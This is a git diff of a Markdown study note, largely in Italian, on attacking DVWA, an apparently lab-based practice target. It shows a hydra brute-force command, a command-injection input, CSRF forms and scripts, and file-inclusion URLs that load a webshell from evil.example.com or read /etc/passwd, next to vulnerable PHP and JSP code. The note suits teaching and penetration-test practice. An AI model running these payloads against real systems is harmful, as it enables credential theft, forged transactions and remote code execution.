@@ -1,14 +1,30 @@
+<!-- START doctoc generated TOC please keep comment here to allow auto update -->
+<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
+**Table of Contents**  *generated with [DocToc](https://github.com/thlorenz/doctoc)*
+
+- [DVWA](#dvwa)
+  - [Brute force](#brute-force)
+  - [Command injection](#command-injection)
+  - [CSRF](#csrf)
+  - [File inclusion](#file-inclusion)
+
+<!-- END doctoc generated TOC please keep comment here to allow auto update -->
+
 # DVWA
 
 > http://www.dvwa.co.uk/
 
-Default credentials: admin/password
+- DVWA
+	- Host: 172.0.17.2
+	- Default credentials: admin/password
+- Malicious web server
+	- Host: 172.0.17.3
 
 ## Brute force
 
-- retrieve a valid PHPSESSID (`$1`)
+- recupera un PHPSESSID valido (`$1`)
 
-- launch:
+- lancia:
 
 	`$ hydra -l admin -P rockyou.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=low"`
 
@@ -16,7 +32,7 @@ Default credentials: admin/password
 
 ## Command injection
 
-- submit:
+- inserisci i seguenti valori:
 
 	`; CMD`
 
@@ -33,111 +49,126 @@ L'attacco ha come obiettivo le richieste che cambiano lo stato interno del serve
 Si ha una vulnerabilità "stored CSRF" quando l'attaccante è in grado di rendere persistente l'attacco direttamente sul sito vulnerabile.
 A tale scopo si memorizza un tag IMG o IFRAME in un campo che accetta HTML o si realizza un più complesso attacco di XSS.
 
-Example (GET method):
+Esempi (metodo GET):
 
-	<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a>
+```
+<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a>
+```
 
-	or
+o
 
-	<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="0" height="0" border="0">
+```
+<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="0" height="0" border="0">
+```
 
+Esempi (metodo POST):
 
+```
+<form action="<nowiki>http://bank.com/transfer.do</nowiki>" method="POST">
+<input type="hidden" name="acct" value="MARIA"/>
+<input type="hidden" name="amount" value="100000"/>
+<input type="submit" value="View my pictures"/>
+</form>
+```
 
-Example (POST method):
+o
 
-	<form action="<nowiki>http://bank.com/transfer.do</nowiki>" method="POST">
-	<input type="hidden" name="acct" value="MARIA"/>
-	<input type="hidden" name="amount" value="100000"/>
-	<input type="submit" value="View my pictures"/>
-	</form>
+```
+<body onload="document.forms[0].submit()">
+<form...>
+```
 
-	or
+o
 
-	<body onload="document.forms[0].submit()">
-	<form...>
+```
+<script>
+function put() {
+	var x = new XMLHttpRequest();
+	x.open("PUT","http://bank.com/transfer.do",true);
+	x.setRequestHeader("Content-Type", "application/json"); 
+	x.send(JSON.stringify({"acct":"BOB", "amount":100})); 
+}
+</script>
 
-	or
+<body onload="put()">
+```
 
-	<script>
-	function put() {
-		var x = new XMLHttpRequest();
-		x.open("PUT","http://bank.com/transfer.do",true);
-		x.setRequestHeader("Content-Type", "application/json"); 
-		x.send(JSON.stringify({"acct":"BOB", "amount":100})); 
-	}
-	</script>
-	<body onload="put()">
-
-L'ultima richiesta **non** viene eseguita dai moderni browser grazie alla restrizione same-origin prolicy.
-Questa funzionalità è abilitata di default, a meno che il server abiliti esplicitamente le richieste cross-origin da uno o più siti usando CORS con l'header `Access-Control-Allow-Origin: *`.
+L'ultima richiesta **non** viene eseguita dai moderni browser grazie alla restrizione *same-origin policy*.
+Questa protezione è abilitata di default, a meno che il server abiliti esplicitamente le richieste cross-origin da uno o più siti usando CORS con l'header `Access-Control-Allow-Origin: *`.
 
 ## File inclusion
 
 Questa vulnerabilità si ha quando un'applicazione crea un path per codice eseguibile usando una variabile che è sotto il controllo dell'attaccante,
-in un modo che gli permette di controllare quale file viene eseguito a run time.
+in un modo che gli permette di controllare quale file viene eseguito.
 Sfruttando una vulnerabilità di questo tipo permette una RCE sul server che esegue l'appicazione vulnerabile.
 
-### Remote File Inclusion
+- Remote File Inclusion
 
-L'applicazione scarica ed esegue un file remoto.
+	L'applicazione scarica ed esegue un file remoto.
 
-### Local File Inclusion
+	Exploit:
 
-Come il RFI ma il file è già presente sul server.
+		http://localhost/vulnerabilities/fi/?page=http://172.17.0.3/rfi.php
+
+- Local File Inclusion
+
+	Come il RFI ma il file sfruttato è presente sul server.
+
+	Exploit:
+
+		http://localhost/vulnerabilities/fi/?page=/etc/passwd
 
 #### PHP
 
 Funzioni che includono un file per l'esecuzione sono `include` e `require`.
-La direttiva `allow_url_fopen` o `allow_url_include` abilitata permette di usare una URL per scaricare un file remoto ed eseguirlo.
+La direttiva `allow_url_fopen` o `allow_url_include` (in `php.ini`) abilitata permette di usare una URL per scaricare un file remoto ed eseguirlo.
 Anche se disabilitato è raggirabile con compressione (`zlib://`) o stream audio (`ogg://`) che non ispezionano il flag URL PHP interno.
 Si possono sfruttare anche i wrapper PHP come `php://input`.
 
-Codice vulnerabile
+Codice vulnerabile:
 
-	<form method="get">
-	   <select name="language">
-	      <option value="english">English</option>
-	      <option value="french">French</option>
-	      ...
-	   </select>
-	   <input type="submit">
-	</form>
+```
+<form method="get">
+   <select name="language">
+      <option value="english">English</option>
+      <option value="french">French</option>
+      ...
+   </select>
+   <input type="submit">
+</form>
 
-	<?php
-	   if ( isset( $_GET['language'] ) ) {
-	      include( $_GET['language'] . '.php' );
-	   }
-	?>
+<?php
+   if ( isset( $_GET['language'] ) ) {
+      include( $_GET['language'] . '.php' );
+   }
+?>
+```
 
-Exploit
+Exploit:
 
-	/vulnerable.php?language=http://evil.example.com/webshell.txt?
-	/vulnerable.php?language=C:\\ftp\\upload\\exploit
-	/vulnerable.php?language=C:\\notes.txt%00
-	/vulnerable.php?language=../../../../../etc/passwd%00
-	/vulnerable.php?language=../../../../../proc/self/environ%00
+```
+/vulnerable.php?language=http://evil.example.com/webshell.txt?
+/vulnerable.php?language=C:\\ftp\\upload\\exploit
+/vulnerable.php?language=C:\\notes.txt%00
+/vulnerable.php?language=../../../../../etc/passwd%00
+/vulnerable.php?language=../../../../../proc/self/environ%00
+```
 
 #### JSP
 
-JSP è vulnerabile a Null byte injection (`%00`)
+Anche le JSP sono vulnerabili a Null byte injection (`%00`)
 
-Codice vulnerabile
+Codice vulnerabile:
 
-	<%
-	   String p = request.getParameter("p");
-	   @include file="<%="includes/" + p +".jsp"%>"
-	%>
+```
+<%
+   String p = request.getParameter("p");
+   @include file="<%="includes/" + p +".jsp"%>"
+%>
+```
 
-Exploit
+Exploit:
 
-	/vulnerable.jsp?p=../../../../var/log/access.log%00
-
-- send GET request:
-
-	http://localhost/vulnerabilities/fi/?page=../../../../../etc/passwd
-
-**TODO: approfondisci meglio** 
-
-- https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601
-- https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/
-
+```
+/vulnerable.jsp?p=../../../../var/log/access.log%00
+```
